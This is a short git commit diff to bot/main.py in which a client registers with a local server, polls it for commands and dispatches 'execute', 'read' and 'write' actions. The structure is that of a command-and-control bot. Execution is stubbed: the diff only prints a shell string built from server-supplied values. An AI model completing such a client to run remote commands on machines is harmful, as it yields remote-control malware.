2b9e7b5c79fbd868596895ec76b470e72df74cec
leUnknown64 <dergermankind67@gmail.com>
2024-11-12 15:58:10 -0500

    client polls for commands and parses each command individually

--- bot/main.py
+++ bot/main.py
@@ -6,7 +6,25 @@
 # ===---------------------------------------------------------------------=== #
 
 from aiohttp import ClientSession
+from time import sleep
 import asyncio
+
+
+def parse_command(command: dict) -> None:
+    try:
+        if command['action'] == 'execute':
+            bash_cmd = command['path'] + ' ' + ' '.join(command['payload'])
+            print(bash_cmd)
+        elif command['action'] == 'read':
+            # handle read
+            pass
+        elif command['action'] == 'write':
+            # handle write
+            pass
+        else:
+            print(f"Unknown action: {command['action']}")
+    except Exception as e:
+        print(f'Exception in parsing command: {e}')
 
 async def obtain_id() -> dict:
     async with ClientSession() as session:
@@ -17,10 +35,20 @@ async def obtain_id() -> dict:
             return json_reply['id']
 
 
-def main():
-    id = asyncio.run(obtain_id())
-    print(id)
- 
+async def main():
+    id = await obtain_id()
+    cmd_queue = []
+    while True:
+        async with ClientSession() as session:
+            url = f'http://localhost:8080/check/{id}'
+            method = 'GET'
+            async with session.request(method, url) as response:
+                returned_cmds = await response.json()
+                for cmd in returned_cmds:
+                    cmd_queue.append(cmd)
+        if len(cmd_queue) > 0:
+            parse_command(cmd_queue.pop(0))
+        sleep(5)
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
